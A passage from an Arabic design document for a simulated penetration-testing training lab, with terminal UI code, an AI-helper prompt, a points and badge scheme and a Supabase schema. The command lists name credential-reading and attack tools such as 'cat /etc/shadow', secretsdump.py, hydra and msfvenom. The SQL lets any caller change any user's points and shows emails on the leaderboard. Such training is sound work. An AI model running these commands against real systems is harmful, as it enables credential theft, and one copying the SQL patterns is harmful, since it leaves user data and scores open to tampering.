              value={filterDifficulty}
              onChange={e => setFilterDifficulty(e.target.value)}
              className="bg-[var(--bg-card)] border border-[var(--border-color)] rounded-lg px-3 py-2 text-sm"
            >
              <option value="all">كل المستويات</option>
              <option value="مبتدئ">مبتدئ ⭐</option>
              <option value="متوسط">متوسط ⭐⭐</option>
              <option value="متقدم">متقدم ⭐⭐⭐</option>
              <option value="خبير">خبير ⭐⭐⭐⭐</option>
            </select>

            <div className="text-xs opacity-50 mr-auto">
              {filteredMachines.length} جهاز | {filteredMachines.filter(m => completedIds.has(m.id)).length} مكتمل
            </div>
          </div>
        </div>
      )}

      {/* ═══ Content based on view mode ═══════════════════ */}
      <div className="max-w-7xl mx-auto px-6 pb-12">
        {viewMode === "machines" && (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {filteredMachines.map(machine => (
              <MachineCard
                key={machine.id}
                machine={machine}
                completed={completedIds.has(machine.id)}
                progress={machineProgress[machine.id]}
                locked={!canAccessMachine(machine, completedIds)}
                onLaunch={() => handleLaunch(machine)}
              />
            ))}
          </div>
        )}

        {viewMode === "networks" && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {NETWORKS.map(net => (
              <NetworkCard 
                key={net.id} 
                network={net} 
                completedMachines={completedIds}
                onOpen={() => setActiveNetwork(net)}
              />
            ))}
          </div>
        )}

        {viewMode === "chains" && (
          <AttackChainsView chains={ATTACK_CHAINS} completedMachines={completedIds} />
        )}

        {viewMode === "ctf" && <CTFView />}
      </div>

      {/* ═══ Sidebar — Leaderboard ═══════════════════════ */}
      <ScoreBoard className="fixed right-4 top-32 hidden xl:block" />

      {/* ═══ Floating AI Helper ═══════════════════════════ */}
      <AIHelperButton context="lab" />
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Helper components
// ═══════════════════════════════════════════════════════════

function StatCard({ icon: Icon, label, value, max, color }: any) {
  return (
    <div className="bg-[var(--bg-card)] border border-[var(--border-color)] rounded-xl px-4 py-3 min-w-[140px]">
      <div className="flex items-center gap-2 mb-1">
        <Icon className={`w-4 h-4 text-${color}-500`} />
        <span className="text-xs opacity-70">{label}</span>
      </div>
      <div className="text-xl font-bold">
        {value}
        {max && <span className="text-sm opacity-50"> / {max}</span>}
      </div>
    </div>
  );
}

function calcLevel(points: number): string {
  if (points < 100) return "Newbie";
  if (points < 500) return "Junior";
  if (points < 1500) return "Intermediate";
  if (points < 4000) return "Advanced";
  if (points < 8000) return "Expert";
  return "Elite";
}

function initProgress(): Progress {
  return {
    recon: false,
    enumeration: false,
    exploitation: false,
    postExploit: false,
    privesc: false,
    root: false,
    flagsCapture: [],
  };
}

function Watermark({ text }: { text: string }) {
  return (
    <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
      <div 
        className="absolute inset-0"
        style={{
          backgroundImage: `repeating-linear-gradient(
            -35deg,
            transparent,
            transparent 200px,
            rgba(255,255,255,0.05) 200px,
            rgba(255,255,255,0.05) 400px
          )`,
        }}
      >
        {Array.from({ length: 30 }).map((_, i) => (
          <div
            key={i}
            className="absolute text-xs whitespace-nowrap select-none"
            style={{
              opacity: 0.07,
              transform: 'rotate(-35deg)',
              top: `${(i * 12) % 100}%`,
              left: `${(i * 23) % 100}%`,
              fontFamily: 'monospace',
            }}
          >
            {text}
          </div>
        ))}
      </div>
    </div>
  );
}

// Stub components — implementation in separate files
function NetworkCard(props: any) { return null; }
function AttackChainsView(props: any) { return null; }
function CTFView() { return null; }
function triggerConfetti() {}
function showToast(msg: string, type: string) {}
```

---

## 7. محرك الـ Terminal الذكي

```tsx
// /src/components/lab/Terminal.tsx
import { useState, useRef, useEffect, useCallback } from "react";
import { processCommand, type CommandContext } from "@/lib/lab/terminalSimulator";
import type { Machine, Progress, TerminalLine } from "@/types/lab";
import { Maximize2, Minimize2, Copy, Download, X, 
         Bot, Settings, Palette } from "lucide-react";

interface TerminalProps {
  machine: Machine;
  currentProgress: Progress;
  onProgressUpdate: (p: Progress) => void;
  onFlagCapture: (points: number, flagId: string) => void;
  onClose: () => void;
  userCanDownload: boolean;
  isGuest: boolean;
  remainingAttempts: number;
}

const THEMES = {
  kali:      { bg: "#1a1b26", text: "#a9b1d6", accent: "#7aa2f7", prompt: "#9ece6a" },
  matrix:    { bg: "#000000", text: "#00ff00", accent: "#00ff41", prompt: "#00ff00" },
  dracula:   { bg: "#282a36", text: "#f8f8f2", accent: "#bd93f9", prompt: "#50fa7b" },
  solarized: { bg: "#002b36", text: "#839496", accent: "#268bd2", prompt: "#859900" },
  amber:     { bg: "#1a0a00", text: "#ffb000", accent: "#ff8000", prompt: "#ffb000" },
};

export function Terminal({ 
  machine, currentProgress, onProgressUpdate, 
  onFlagCapture, onClose, userCanDownload, isGuest, remainingAttempts 
}: TerminalProps) {
  const [lines, setLines] = useState<TerminalLine[]>([]);
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const [theme, setTheme] = useState<keyof typeof THEMES>("kali");
  const [fontSize, setFontSize] = useState(14);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [promptLabel, setPromptLabel] = useState(`attacker@penguide:~$`);
  const [showHints, setShowHints] = useState(false);
  const [hintLevel, setHintLevel] = useState(0); // 0-3
  
  const bottomRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const sessionStartTime = useRef(Date.now());
  const commandLog = useRef<{cmd: string, timestamp: number}[]>([]);

  const currentTheme = THEMES[theme];

  // ═══ Welcome banner on mount ═══
  useEffect(() => {
    const banner: TerminalLine[] = [
      mkLine("separator", "╔══════════════════════════════════════════════════════════════╗"),
      mkLine("banner",    `║  🎯 TARGET:  ${machine.name.padEnd(48)}║`),
      mkLine("banner",    `║  🌐 IP:      ${machine.ip.padEnd(48)}║`),
      mkLine("banner",    `║  🖥️  OS:      ${machine.os.substring(0,48).padEnd(48)}║`),
      mkLine("banner",    `║  ⭐ DIFF:    ${"⭐".repeat(machine.difficultyStars).padEnd(48)}║`),
      mkLine("banner",    `║  🏆 POINTS:  ${String(machine.points).padEnd(48)}║`),
      mkLine("banner",    `║  🎓 BUILT BY: Abdullah Almsan — PenGuide v4.0${" ".repeat(15)}║`),
      mkLine("separator", "╚══════════════════════════════════════════════════════════════╝"),
      mkLine("info",      ""),
      mkLine("warning",   "⚠️  تنبيه قانوني: هذه بيئة محاكاة آمنة. الأوامر هنا تعليمية."),
      mkLine("warning",   "    لا تستخدم هذه التقنيات على أنظمة بدون إذن صريح من المالك."),
      mkLine("info",      ""),
      mkLine("info",      `[*] الاتصال بـ ${machine.ip} نجح!`),
      mkLine("info",      `[*] اكتب 'help' لعرض الأوامر، أو 'hint' لتلميح.`),
      ...(machine.hint ? [mkLine("warning", `💡 تلميح أولي: ${machine.hint}`)] : []),
      mkLine("separator", ""),
    ];

    if (isGuest) {
      banner.push(
        mkLine("error", `🔒 وضع التجربة المجانية: ${remainingAttempts} محاولة متبقية اليوم`),
        mkLine("info",  `   سجّل حساباً لفتح كل الأجهزة الـ 32 + AI helper`),
      );
    }

    setLines(banner);
    inputRef.current?.focus();
  }, [machine, isGuest, remainingAttempts]);

  // ═══ Auto-scroll ═══
  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [lines]);

  // ═══ Process command ═══
  const handleCommand = useCallback((cmd: string) => {
    if (!cmd.trim()) return;

    // Save to log for replay
    commandLog.current.push({ cmd, timestamp: Date.now() });

    // Save to history
    setHistory(prev => [cmd, ...prev].slice(0, 100));
    setHistoryIdx(-1);

    // Display the command line
    const promptLine = mkLine("prompt", cmd, promptLabel);

    // Process via simulator
    const ctx: CommandContext = {
      machine,
      progress: currentProgress,
      onProgressChange: onProgressUpdate,
      onPromptLabelChange: setPromptLabel,
      onFlagCapture,
      sessionDuration: Date.now() - sessionStartTime.current,
    };
    
    const responseLines = processCommand(cmd, ctx);
    
    setLines(prev => [...prev, promptLine, ...responseLines]);
    setInput("");
  }, [machine, currentProgress, onProgressUpdate, onFlagCapture, promptLabel]);

  // ═══ Keyboard handling ═══
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      handleCommand(input);
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      const newIdx = Math.min(historyIdx + 1, history.length - 1);
      if (newIdx >= 0) {
        setHistoryIdx(newIdx);
        setInput(history[newIdx]);
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const newIdx = Math.max(historyIdx - 1, -1);
      setHistoryIdx(newIdx);
      setInput(newIdx === -1 ? "" : history[newIdx]);
    } else if (e.key === "Tab") {
      e.preventDefault();
      const completion = autocomplete(input, machine);
      if (completion) setInput(completion);
    } else if (e.key === "c" && e.ctrlKey) {
      // Allow normal copy
    } else if (e.key === "l" && e.ctrlKey) {
      e.preventDefault();
      setLines([]);
    }
  };

  // ═══ Hint system ═══
  const showNextHint = () => {
    if (hintLevel >= machine.hints.length) {
      setLines(prev => [...prev, mkLine("info", "💡 لا مزيد من التلميحات. استخدم AI Helper للحصول على شرح.")]);
      return;
    }
    const hint = machine.hints[hintLevel];
    const cost = hint.cost || 0;
    setLines(prev => [...prev, 
      mkLine("warning", `💡 تلميح ${hintLevel + 1}/${machine.hints.length}${cost > 0 ? ` (-${cost} نقاط)` : ' (مجاني)'}`),
      mkLine("info", `   ${hint.text}`),
    ]);
    setHintLevel(prev => prev + 1);
  };

  // ═══ Quick command buttons ═══
  const QUICK_COMMANDS = {
    Linux: ["nmap -sV -sC", "enum4linux -a", "msfconsole", "gobuster dir -u", "hydra -L users.txt", "sqlmap -u", "linpeas.sh"],
    Windows: ["nmap -sV -sC", "enum4linux -a", "smbclient -L //", "crackmapexec smb", "evil-winrm -u", "winpeas.exe"],
    AD: ["GetUserSPNs.py", "secretsdump.py", "bloodhound-python", "smbmap -H", "ldapsearch", "kerbrute"],
    BOF: ["msf-pattern_create", "msf-pattern_offset", "msfvenom -p", "!mona modules", "!mona find"],
  };
  
  const cmdsForCategory = QUICK_COMMANDS[machine.category as keyof typeof QUICK_COMMANDS] || QUICK_COMMANDS.Linux;

  // ═══ Export session ═══
  const exportSession = (format: "markdown" | "report") => {
    if (!userCanDownload) {
      setLines(prev => [...prev, mkLine("error", "🔒 التحميل متاح للمشتركين فقط")]);
      return;
    }
    const md = generateSessionReport(machine, lines, commandLog.current, currentProgress, format);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${machine.id}_session_${Date.now()}.md`;
    a.click();
  };

  // ═══ Render ═══
  return (
    <div 
      className="fixed inset-0 z-50 flex flex-col font-mono" 
      style={{ backgroundColor: currentTheme.bg, color: currentTheme.text, fontSize: `${fontSize}px` }}
    >
      {/* ═══ Header ═══════════════════════════════════ */}
      <div className="flex items-center justify-between border-b border-gray-700 px-4 py-2" style={{ backgroundColor: `${currentTheme.bg}cc` }}>
        <div className="flex items-center gap-3">
          <div className="flex gap-1.5">
            <button onClick={onClose} className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400" title="إغلاق" />
            <div className="w-3 h-3 rounded-full bg-yellow-500" />
            <div className="w-3 h-3 rounded-full bg-green-500" />
          </div>
          <span className="text-xs opacity-70">
            🎯 {machine.name} · {machine.ip} · {Math.floor((Date.now() - sessionStartTime.current) / 1000)}s
          </span>
        </div>

        <div className="flex items-center gap-2">
          {/* Progress chips */}
          <ProgressChips progress={currentProgress} />
          
          {/* Theme picker */}
          <select 
            value={theme} 
            onChange={e => setTheme(e.target.value as any)}
            className="bg-gray-800 text-xs px-2 py-1 rounded"
          >
            {Object.keys(THEMES).map(t => <option key={t} value={t}>{t}</option>)}
          </select>

          {/* Font size */}
          <button onClick={() => setFontSize(s => Math.max(10, s - 1))} className="text-xs opacity-70 hover:opacity-100">A-</button>
          <button onClick={() => setFontSize(s => Math.min(20, s + 1))} className="text-xs opacity-70 hover:opacity-100">A+</button>

          {/* Hint */}
          <button onClick={showNextHint} className="text-xs opacity-70 hover:opacity-100" title="تلميح">💡</button>

          {/* AI Helper */}
          <button 
            onClick={() => openAIWithContext(machine, currentProgress, lines)} 
            className="text-xs opacity-70 hover:opacity-100" 
            title="استدعاء AI"
          >
            <Bot className="w-4 h-4 inline" />
          </button>

          {/* Export */}
          <button onClick={() => exportSession("markdown")} className="text-xs opacity-70 hover:opacity-100" title="تصدير الجلسة">
            <Download className="w-4 h-4 inline" />
          </button>

          {/* Fullscreen */}
          <button onClick={() => setIsFullscreen(!isFullscreen)} className="text-xs opacity-70 hover:opacity-100">
            {isFullscreen ? <Minimize2 className="w-4 h-4 inline" /> : <Maximize2 className="w-4 h-4 inline" />}
          </button>
        </div>
      </div>

      {/* ═══ Terminal Output ═══════════════════════════════════ */}
      <div
        className="flex-1 overflow-y-auto px-4 py-2 cursor-text"
        onClick={() => inputRef.current?.focus()}
        onCopy={(e) => {
          // Limit copy to 3 lines max
          const sel = window.getSelection()?.toString() || "";
          const lineCount = sel.split("\n").length;
          if (lineCount > 3) {
            e.preventDefault();
            navigator.clipboard.writeText(sel.split("\n").slice(0, 3).join("\n") + "\n[... محدود إلى 3 أسطر — PenGuide]");
          }
        }}
      >
        {lines.map(line => (
          <TerminalLineRender key={line.id} line={line} theme={currentTheme} />
        ))}
        <div ref={bottomRef} />
      </div>

      {/* ═══ Quick Commands ════════════════════════════════════ */}
      <div className="flex flex-wrap gap-1.5 px-4 py-2 border-t border-gray-700" style={{ backgroundColor: `${currentTheme.bg}cc` }}>
        {cmdsForCategory.map(cmd => (
          <button
            key={cmd}
            onClick={() => setInput(cmd + " " + machine.ip)}
            className="text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700 opacity-70 hover:opacity-100"
          >
            {cmd}
          </button>
        ))}
      </div>

      {/* ═══ Input Line ═══════════════════════════════════════ */}
      <div className="flex items-center gap-2 px-4 py-2 border-t border-gray-700" style={{ backgroundColor: `${currentTheme.bg}` }}>
        <span style={{ color: currentTheme.prompt }} className="text-sm whitespace-nowrap">{promptLabel}</span>
        <input
          ref={inputRef}
          type="text"
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          spellCheck={false}
          autoComplete="off"
          className="flex-1 bg-transparent outline-none text-sm"
          style={{ color: currentTheme.text }}
          placeholder="اكتب الأمر هنا... (Tab للإكمال، ↑↓ للسجل، Ctrl+L للمسح)"
        />
      </div>
    </div>
  );
}

// Helper functions and sub-components
let lineCounter = 0;
function mkLine(type: TerminalLine["type"], text: string, promptLabel?: string): TerminalLine {
  return { id: ++lineCounter, type, text, promptLabel, timestamp: Date.now() };
}

function autocomplete(input: string, machine: Machine): string | null {
  const commands = [
    "nmap -sV -sC", "nmap -p-", "nmap -sU", "nmap --script vuln",
    "enum4linux -a", "smbclient -L //", "crackmapexec smb",
    "msfconsole", "use exploit/", "set RHOSTS", "set LHOST", "set PAYLOAD", "exploit", "run",
    "hydra -L users.txt -P passwords.txt", "searchsploit", "sqlmap -u",
    "gobuster dir -u", "ffuf -u", "feroxbuster -u",
    "whoami", "id", "uname -a", "hostname", 
    "cat /etc/passwd", "cat /etc/shadow", "cat /etc/hosts",
    "find / -perm -u=s 2>/dev/null", "find / -writable 2>/dev/null",
    "sudo -l", "linpeas.sh", "winpeas.exe", "linenum.sh",
    "GetUserSPNs.py", "secretsdump.py", "bloodhound-python",
    "msfvenom -p", "msf-pattern_create -l", "msf-pattern_offset -q",
    "cat flag.txt", "cat root.txt", "cat user.txt", "cat proof.txt",
    "help", "hint", "clear", "exit",
  ];
  const match = commands.find(c => c.startsWith(input));
  return match ? match + " " + machine.ip : null;
}

function ProgressChips({ progress }: { progress: Progress }) {
  const stages = [
    { key: "recon", label: "Recon" },
    { key: "enumeration", label: "Enum" },
    { key: "exploitation", label: "Exploit" },
    { key: "postExploit", label: "Post" },
    { key: "privesc", label: "PrivEsc" },
    { key: "root", label: "Root" },
  ];
  return (
    <div className="flex gap-1">
      {stages.map(s => (
        <span
          key={s.key}
          className={`text-[10px] px-1.5 py-0.5 rounded ${
            progress[s.key as keyof Progress]
              ? "bg-green-900 text-green-300"
              : "bg-gray-800 text-gray-500"
          }`}
        >
          {s.label}
        </span>
      ))}
    </div>
  );
}

function TerminalLineRender({ line, theme }: any) {
  const colorMap: any = {
    success:   "#9ece6a",
    error:     "#f7768e",
    warning:   "#e0af68",
    info:      "#7aa2f7",
    banner:    "#bb9af7",
    separator: "#565f89",
    prompt:    theme.prompt,
    output:    theme.text,
  };
  const color = colorMap[line.type] || theme.text;
  
  if (line.type === "prompt") {
    return (
      <div className="whitespace-pre-wrap leading-relaxed">
        <span style={{ color: theme.prompt }}>{line.promptLabel}</span>
        <span style={{ color: theme.text }}> {line.text}</span>
      </div>
    );
  }
  return (
    <div className="whitespace-pre-wrap leading-relaxed" style={{ color }}>
      {line.text}
    </div>
  );
}

function openAIWithContext(machine: Machine, progress: Progress, lines: TerminalLine[]) {
  // Send last 20 lines + machine info to AI assistant
  const context = {
    machine: { name: machine.name, ip: machine.ip, os: machine.os, category: machine.category },
    progress,
    recentOutput: lines.slice(-20).map(l => l.text).join("\n"),
  };
  // Open AI panel with context
  window.dispatchEvent(new CustomEvent("openAIWithLabContext", { detail: context }));
}

function generateSessionReport(machine: Machine, lines: TerminalLine[], commands: any[], progress: Progress, format: string): string {
  // Returns full markdown report
  return `# تقرير اختبار اختراق — ${machine.name}\n\n...`;
}
```

---

## 8. نظام التكامل مع المساعد الذكي AI

### 🤖 آلية التكامل

عندما يضغط المستخدم على زر AI داخل الـ Terminal، يحدث التالي:

```typescript
// /src/lib/lab/aiContextProvider.ts

export function buildLabContext(
  machine: Machine, 
  progress: Progress, 
  recentLines: TerminalLine[]
): string {
  return `
## سياق المختبر الافتراضي

أنا حالياً أختبر الجهاز التالي في مختبر PenGuide:

**معلومات الجهاز:**
- الاسم: ${machine.name}
- IP: ${machine.ip}
- نظام التشغيل: ${machine.os}
- الفئة: ${machine.category}
- الصعوبة: ${machine.difficulty}

**البورتات المفتوحة:**
${machine.ports.map(p => `- ${p.port}/${p.service} (${p.version})${p.vulnerable ? ' ⚠️ vulnerable' : ''}`).join('\n')}

**التقدم الحالي:**
- Recon: ${progress.recon ? '✅' : '❌'}
- Enumeration: ${progress.enumeration ? '✅' : '❌'}
- Exploitation: ${progress.exploitation ? '✅' : '❌'}
- Post-Exploit: ${progress.postExploit ? '✅' : '❌'}
- PrivEsc: ${progress.privesc ? '✅' : '❌'}
- Root: ${progress.root ? '✅' : '❌'}

**آخر مخرجات Terminal:**
\`\`\`
${recentLines.slice(-10).map(l => l.text).join('\n')}
\`\`\`

ساعدني في الخطوة التالية بناءً على هذا السياق.
`;
}
```

### 🎯 سلوك AI داخل المختبر

عند فتح AI من المختبر، النظام يضيف system prompt إضافي:

```
أنت مرشد PenGuide داخل بيئة المختبر. المستخدم يحاول اختراق جهاز محدد.
- ساعده خطوة بخطوة في رحلة الاختراق
- لا تكشف الـ flag مباشرة، أرشده للوصول إليها بنفسه
- إذا توقف، اقترح الأمر التالي المنطقي
- ركّز على المرحلة الحالية: ${currentStage}
- لا تطلب منه استخدام أدوات غير متوفرة في الـ Terminal
- استخدم الأوامر التي يدعمها المحاكي (في قائمة الأوامر المسموحة)
- إذا طلب الحل الكامل (walkthrough): قدّمه له لكن نبّهه أنه يفقد جزءاً من النقاط
```

### 🧠 ميزات AI المختبرية

```
1. "ما الخطوة التالية؟"
   → AI يحلل التقدم ويقترح الأمر التالي
   
2. "اشرح هذه الـ output"
   → يفسّر ناتج nmap/enum/etc

3. "اعطني تلميحاً"
   → نفس نظام التلميحات المتدرج
   
4. "ولّد لي exploit script"
   → يكتب exploit.py مخصص للجهاز

5. "اكتب لي تقريراً"
   → ينشئ تقرير اختبار اختراق احترافي

6. "أنا عالق"
   → يحلل الحالة ويقترح حلولاً متعددة

7. "ابحث عن CVE"
   → يبحث في قاعدة CVE المدمجة + الإنترنت
```

---

## 9. نظام النقاط والشارات والـ Leaderboard

### 💎 نظام النقاط الكامل

```typescript
// نقاط الجهاز الأساسية × مضاعفات

const POINT_CALCULATION = {
  base: machine.points,
  
  // مضاعفات السرعة
  speedMultiplier: {
    under15min:  2.0,    // First Blood (أول 5 يحلونها)
    under1hour:  1.5,
    under3hours: 1.2,
    overflow:    1.0,
  },
  
  // مضاعفات الصعوبة (تُطبّق على base)
  difficultyMultiplier: {
    "مبتدئ":   1.0,
    "متوسط":   1.3,
    "متقدم":   1.7,
    "خبير":    2.5,
  },
  
  // خصومات
  hintPenalty: {
    hint1: 0,         // مجاني
    hint2: -5,
    hint3: -15,
    walkthrough: -50, // كشف الحل
  },
  
  // مكافآت
  bonuses: {
    dailyChallenge: +25,
    weeklyChallenge: +100,
    firstBlood: +50,         // أول من يحل الجهاز هذا اليوم
    streakBonus: +10,        // كل يوم متتالي
    perfectRun: +30,         // بدون تلميحات
    multiPath: +20,          // إذا اكتشف >1 طريقة
  },
};
```

### 🏆 الشارات الـ 24 الكاملة

```yaml
# تصنيف Newbie (مبتدئ)
🥉 First Blood:           إكمال أول جهاز                     +50 pts
🎯 Recon Master:          استخدام nmap في 5 أجهزة            +30 pts
🌐 Web Hunter:            إكمال أول جهاز ويب                 +30 pts
🐧 Linux Lover:           إكمال أول جهاز Linux               +30 pts

# تصنيف Junior
🥈 Scriptkiddie:          إكمال 5 أجهزة                     +75 pts
💉 SQL Slayer:            استغلال SQLi في 3 أجهزة            +50 pts
🔓 Exploit Engineer:      استخدام metasploit بنجاح            +50 pts
🪟 Windows Warrior:       إكمال أول جهاز Windows              +75 pts

# تصنيف Mid
🥇 Junior Pentester:      إكمال 10 أجهزة                     +150 pts
🦊 Web App Specialist:    إكمال جميع أجهزة web-easy + web-med +200 pts
🐉 Linux Master:          إكمال جميع أجهزة linux-easy + med   +200 pts
🔥 Speed Demon:           إكمال جهازين تحت 15 دقيقة            +100 pts

# تصنيف Senior
💎 Eternal Blue:          إكمال جميع أجهزة Windows            +250 pts
🏰 Domain Dominator:      إكمال شبكة AD كاملة                 +400 pts
🌐 Pivot Champion:        إكمال شبكة Pivoting                +400 pts
💀 BOF Master:            إكمال Brainpan + VulnServer كامل    +500 pts

# تصنيف Expert
👑 The King:              إكمال 25 جهاز                      +600 pts
🎓 Mentor:                مساعدة 10 مستخدمين في الدعم         +200 pts
📚 Bookworm:              قراءة كل المحاضرات                  +150 pts
🔬 Reverser:              إكمال Reverse Engineering Lab       +300 pts

# تصنيف Elite (لا يحصل عليها إلا قلة)
👑 The Elite Hacker:      إكمال جميع 32 جهاز                  +1000 pts
⚡ Speed Run Master:       إكمال 5 أجهزة بأقل من ساعة         +500 pts
🌟 CTF Champion:          الفوز في 3 تحديات أسبوعية           +500 pts
🏆 Hall of Fame:          ترتيب أول 3 على Leaderboard شهرياً  +1000 pts
```

### 📊 المستويات (Levels)

```
Level 1: Newbie         (0 - 99 pts)
Level 2: Junior         (100 - 499 pts)
Level 3: Apprentice     (500 - 1499 pts)
Level 4: Skilled        (1500 - 2999 pts)
Level 5: Advanced       (3000 - 4999 pts)
Level 6: Expert         (5000 - 7499 pts)
Level 7: Master         (7500 - 9999 pts)
Level 8: Elite          (10000+ pts)
```

### 🥇 Leaderboard

```typescript
// ترتيب أفضل 100 — مفلتر زمنياً
const leaderboardTabs = [
  { period: "today",   label: "اليوم" },
  { period: "week",    label: "الأسبوع" },
  { period: "month",   label: "الشهر" },
  { period: "alltime", label: "كل الأوقات" },
];

// كل مستخدم في القائمة:
{
  rank: 1,
  displayName: "مستخدم #1042",  // مخفي إذا اختار
  level: "Elite",
  totalPoints: 9854,
  machinesCompleted: 28,
  badgesEarned: 18,
  lastActive: "2 دقيقة",
  badge: "🏆", // أعلى شارة
  isCurrentUser: false,
}
```

---

## 10. قاعدة البيانات Supabase

### الجداول المطلوبة (إضافة على ما هو موجود):

```sql
-- ═══ Lab completions (تتبع إنجازات الأجهزة) ═══
CREATE TABLE lab_completions (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id         UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  machine_id      TEXT NOT NULL,
  flag_id         TEXT,
  points_earned   INT NOT NULL DEFAULT 0,
  bonus_points    INT DEFAULT 0,
  hint_count      INT DEFAULT 0,
  walkthrough_used BOOLEAN DEFAULT FALSE,
  duration_seconds INT,
  progress_state  JSONB,
  command_log     JSONB,
  ip_used         TEXT,
  user_agent      TEXT,
  completed_at    TIMESTAMP DEFAULT NOW(),
  
  UNIQUE(user_id, machine_id, flag_id)
);

CREATE INDEX idx_lab_completions_user ON lab_completions(user_id);
CREATE INDEX idx_lab_completions_machine ON lab_completions(machine_id);
CREATE INDEX idx_lab_completions_date ON lab_completions(completed_at DESC);

-- ═══ User badges ═══
CREATE TABLE user_badges (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id         UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  badge_id        TEXT NOT NULL,
  earned_at       TIMESTAMP DEFAULT NOW(),
  context_data    JSONB,
  
  UNIQUE(user_id, badge_id)
);

-- ═══ Daily challenges ═══
CREATE TABLE daily_challenges (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  challenge_date  DATE UNIQUE NOT NULL,
  machine_id      TEXT NOT NULL,
  bonus_points    INT DEFAULT 25,
  multiplier      DECIMAL(2,1) DEFAULT 2.0,
  participants    INT DEFAULT 0,
  completers      INT DEFAULT 0
);

-- ═══ CTF events ═══
CREATE TABLE ctf_events (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  week_number     INT NOT NULL,
  year            INT NOT NULL,
  title           TEXT NOT NULL,
  description     TEXT,
  start_date      TIMESTAMP NOT NULL,
  end_date        TIMESTAMP NOT NULL,
  category        TEXT,
  total_points    INT,
  flags           JSONB,        -- [{name, points, hash}]
  participants    INT DEFAULT 0,
  completers      INT DEFAULT 0,
  
  UNIQUE(week_number, year)
);

-- ═══ CTF submissions ═══
CREATE TABLE ctf_submissions (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id         UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  ctf_id          UUID NOT NULL REFERENCES ctf_events(id) ON DELETE CASCADE,
  flag_name       TEXT NOT NULL,
  points_earned   INT,
  submitted_at    TIMESTAMP DEFAULT NOW()
);

-- ═══ Lab session recordings (for replay) ═══
CREATE TABLE lab_sessions (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id         UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  machine_id      TEXT NOT NULL,
  started_at      TIMESTAMP DEFAULT NOW(),
  ended_at        TIMESTAMP,
  duration_seconds INT,
  command_log     JSONB,
  output_log      JSONB,
  outcome         TEXT,  -- 'completed' | 'abandoned' | 'in_progress'
  flags_captured  TEXT[]
);

-- ═══ Guest lab fingerprints (rate limiting + abuse prevention) ═══
CREATE TABLE guest_lab_attempts (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  fingerprint     TEXT NOT NULL,        -- canvas + user agent + IP hash
  ip_hash         TEXT NOT NULL,
  machine_id      TEXT NOT NULL,
  attempts_today  INT DEFAULT 0,
  last_attempt    TIMESTAMP DEFAULT NOW(),
  blocked_until   TIMESTAMP,
  
  UNIQUE(fingerprint, machine_id)
);

CREATE INDEX idx_guest_fingerprint ON guest_lab_attempts(fingerprint);
CREATE INDEX idx_guest_ip ON guest_lab_attempts(ip_hash);

-- ═══ User streaks (for daily challenge consistency) ═══
CREATE TABLE user_streaks (
  user_id         UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  current_streak  INT DEFAULT 0,
  longest_streak  INT DEFAULT 0,
  last_activity   DATE,
  total_days      INT DEFAULT 0
);

-- ═══ Lab leaderboard view ═══
CREATE OR REPLACE VIEW lab_leaderboard AS
SELECT 
  u.id,
  u.email,
  COALESCE(p.display_name, 'مستخدم #' || SUBSTRING(u.id::text, 1, 6)) AS display_name,
  p.total_points,
  COUNT(DISTINCT lc.machine_id) AS machines_completed,
  COUNT(DISTINCT ub.badge_id) AS badges_earned,
  MAX(lc.completed_at) AS last_active
FROM auth.users u
LEFT JOIN profiles p ON p.id = u.id
LEFT JOIN lab_completions lc ON lc.user_id = u.id
LEFT JOIN user_badges ub ON ub.user_id = u.id
WHERE p.show_in_leaderboard = TRUE
GROUP BY u.id, u.email, p.display_name, p.total_points
ORDER BY p.total_points DESC NULLS LAST;

-- ═══ RLS Policies ═══

-- Lab completions: المستخدم يرى إنجازاته فقط، الأدمن يرى الكل
ALTER TABLE lab_completions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users see own completions"
  ON lab_completions FOR SELECT
  USING (auth.uid() = user_id);

CREATE POLICY "Users insert own completions"
  ON lab_completions FOR INSERT
  WITH CHECK (auth.uid() = user_id);

CREATE POLICY "Admins see all completions"
  ON lab_completions FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM profiles 
      WHERE id = auth.uid() AND role IN ('admin', 'moderator')
    )
  );

-- ═══ Stored procedures ═══

CREATE OR REPLACE FUNCTION increment_user_points(
  user_id UUID, 
  delta INT
) RETURNS VOID AS $$
BEGIN
  UPDATE profiles 
  SET total_points = COALESCE(total_points, 0) + delta,
      updated_at = NOW()
  WHERE id = user_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE OR REPLACE FUNCTION update_user_streak(user_id UUID) 
RETURNS VOID AS $$
DECLARE
  last_date DATE;
BEGIN
  SELECT last_activity INTO last_date 
  FROM user_streaks WHERE user_id = update_user_streak.user_id;
